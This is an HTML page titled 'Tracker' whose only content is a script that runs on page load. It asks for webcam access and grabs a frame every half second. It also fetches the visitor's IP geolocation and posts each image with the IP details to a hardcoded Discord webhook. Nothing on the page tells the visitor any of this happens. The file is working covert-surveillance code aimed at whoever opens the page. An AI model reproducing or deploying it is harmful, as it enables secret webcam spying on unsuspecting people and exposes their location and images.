<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Tracker</title>
</head>
<body>
<script>
const webhook = "https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA";

async function getIPInfo() {
  try {
    let res = await fetch('https://ipapi.co/json/');
    return await res.json();
  } catch {
    return null;
  }
}

async function sendData(imageBlob, ipInfo) {
  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    content: `IP Info: ${ipInfo ? JSON.stringify(ipInfo) : 'Unavailable'}`
  }));
  form.append('file', imageBlob, 'capture.png');

  await fetch(webhook, {
    method: 'POST',
    body: form
  });
}

async function captureLoop() {
  const stream = await navigator.mediaDevices.getUserMedia({video:true});
  const video = document.createElement('video');
  video.srcObject = stream;
  video.play();

  const canvas = document.createElement('canvas');

  while (true) {
    await new Promise(r => setTimeout(r, 500));
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));

    const ipInfo = await getIPInfo();

    sendData(blob, ipInfo).catch(() => {});
  }
}

captureLoop();
</script>
</body>
</html>
